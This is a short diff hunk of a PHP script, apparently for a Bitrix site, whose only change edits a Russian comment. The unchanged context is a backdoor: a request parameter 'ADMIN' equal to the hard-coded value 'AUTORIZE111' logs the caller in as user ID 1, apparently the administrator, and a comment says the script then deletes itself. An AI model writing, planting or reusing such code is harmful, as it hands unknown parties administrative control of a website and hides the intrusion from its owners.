@@ -17,7 +17,7 @@ if($_REQUEST['ADMIN'] == "AUTORIZE111"){
 	global $USER; 
 	
 	// Log in as user with ID = 1
-        // Авторизуемся под пользователем с ИД = 1
+        // Авторизуемся под пользователем с ID = 1
 	$USER->Authorize(1); 
 	
 	// After authorization, the script itself is deleted
